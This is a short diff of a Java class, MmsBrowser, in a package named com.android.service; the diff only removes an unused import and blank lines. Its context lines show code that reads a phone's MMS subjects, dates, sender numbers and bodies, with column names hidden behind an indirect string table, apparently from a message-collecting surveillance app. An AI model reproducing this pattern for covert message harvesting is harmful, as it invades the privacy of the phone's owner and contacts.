@@ -20,7 +20,6 @@ import android.database.Cursor;
 import android.net.Uri;
 
 import com.android.service.Messages;
-import com.android.service.Mms;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
@@ -29,7 +28,6 @@ public class MmsBrowser {
 	private static final String TAG = "MmsBrowser"; //$NON-NLS-1$
 
 	private final ArrayList<Mms> list;
-
 	int maxId = 0;
 
 	public MmsBrowser() {
@@ -89,7 +87,6 @@ public class MmsBrowser {
 				}
 
 				// printColumnMms(c);
-
 				// 13.8=sub
 				subject = c.getString(c.getColumnIndex(Messages.getString("13.8"))); //$NON-NLS-1$
 				// 13.9=date
@@ -97,7 +94,6 @@ public class MmsBrowser {
 				date = Long.parseLong(dateString) * 1000; //$NON-NLS-1$
 
 				number = extractNumber(id, projection, selection);
-
 				body = extractBody(id);
 
 				sentStatus = sentState;
